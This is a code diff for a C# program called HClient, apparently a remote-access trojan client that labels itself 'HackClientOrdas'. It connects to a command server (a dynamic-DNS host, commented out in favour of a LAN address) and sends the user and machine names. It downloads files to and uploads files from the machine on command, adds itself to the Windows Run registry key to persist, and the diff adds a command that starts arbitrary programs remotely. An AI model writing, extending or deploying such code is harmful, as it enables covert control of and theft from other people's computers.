@@ -15,7 +15,7 @@ namespace HClient
     {
         static Socket mySocket; //инициализзируем сокет;
         static MemoryStream ms = new MemoryStream(new byte[256 * 100], 0, 256 * 100, true, true);
-        const double VERSION = 0.7;
+        const double VERSION = 0.9; //версия программы
         static BinaryWriter writer = new BinaryWriter(ms);
         static BinaryReader reader = new BinaryReader(ms);//чтение из потока
         static string currentDir;//положение директории
@@ -29,7 +29,7 @@ namespace HClient
             {"introduce", 3},    //получение информации о клиенте
             {"upload", 4 },      //загрузка файла на компютер клиента
             {"load", 5 },        //скачивание файла с компьютера клиента
-            {"test", 6 },        //скачивание файла с компьютера клиента
+            {"start", 6 },       //запуск приложения на компьютере
             {"check", 100},      //получение информации о версии библиотеки
         };
 
@@ -50,10 +50,11 @@ namespace HClient
             //ShowWindow(handle, SW_HIDE);//функция скрытия окна
 
             Console.Title = "Client";
-            connectionIsOn = false;
-            currentDir = AppDomain.CurrentDomain.BaseDirectory;// сохраненная директория
+            connectionIsOn = false; //есть ли связь с сервером
+            currentDir = AppDomain.CurrentDomain.BaseDirectory; //сохраненная директория
             Connection();
 
+            //поток проверки статуса подключения
             checkConnection = new Thread(() =>
             {
                 while (true)//бесконечный цикл проверки состояния подключения
@@ -81,8 +82,8 @@ namespace HClient
 
                 try
                 {
-                    mySocket.Connect(@"ordashack.sytes.net", 80);      //пробуем подключиться к серверу   
-                    //mySocket.Connect("192.168.0.15", 8080);      //пробуем подключиться к серверу    
+                    //mySocket.Connect(@"ordashack.sytes.net", 80);      //пробуем подключиться к серверу   
+                    mySocket.Connect("192.168.0.14", 8080);      //пробуем подключиться к серверу    
                     //mySocket.Connect(@"127.0.0.1", 8080);
                 }
                 catch
@@ -129,10 +130,12 @@ namespace HClient
         private static void introduse()//при подключении передает информацию о себе
         {
             ms.Position = 0;
+            writer.Write("HackClientOrdas");
             writer.Write(Environment.UserName);
             writer.Write(Environment.MachineName);
-            writer.Write(AppDomain.CurrentDomain.BaseDirectory);
+            writer.Write(currentDir);
             mySocket.Send(ms.GetBuffer());
+           
         }
 
         private static void Update()//обнавление версии
@@ -264,26 +267,17 @@ namespace HClient
                     }
                     
                     break;
-                case 6: //test                 
+                case 6: //запуск приложения на компьютере клиента                                  
+                    string processName = reqOpt[1];
+                    Process.Start(currentDir+"\\"+processName);
                     ms.Position = 0;
-                    writer.Write(6);//код операции
-                    socket.Send(ms.GetBuffer());
-                    ms.Position = 0;
-                    socket.Receive(ms.GetBuffer());
-                    Console.WriteLine(reader.ReadString());
-                    ms.Position = 0;
-                    writer.Write("Test's OVER");
-                    socket.Send(ms.GetBuffer());
-                    ms.Position = 0;
-                    socket.Receive(ms.GetBuffer());
-                    Console.WriteLine(reader.ReadString());
-                    ms.Position = 0;
-                    writer.Write("Test's OVER numb 2");                    
+                    writer.Write(6);
+                    writer.Write("Process " + processName + " has started.");
                     break;
                 case 100: //возвращает информацию о версии                    
                     ms.Position = 0;
                     writer.Write(100);//код операции
-                    writer.Write("Проверка. Версия " + VERSION);
+                    writer.Write("Проверка. Версия -> " + VERSION);
                     break;
                 default: //при неправильном запросе
                     ms.Position = 0;
@@ -340,7 +334,7 @@ namespace HClient
             {
                 BinaryReader readerFile = new BinaryReader(msFile);
                 byte[] data = new byte[lenghFile];
-                using (FileStream fs = new FileStream(currentDir + '\\' + nameFile, FileMode.Create))
+                using (FileStream fs = new FileStream(currentDir + '\\' + nameFile, FileMode.OpenOrCreate))
                 {
                     msFile.Position = 0;
                     socketF.Receive(msFile.GetBuffer());
@@ -374,7 +368,7 @@ namespace HClient
             RegistryKey rkApp = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
             if (rkApp.GetValue("HClientStart") == null)
             {
-                rkApp.SetValue("HClientStart", Path.Combine(Directory.GetCurrentDirectory(), "HClient.exe"));
+                rkApp.SetValue("HClientStart", Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "HClient.exe"));
             }
 
         }
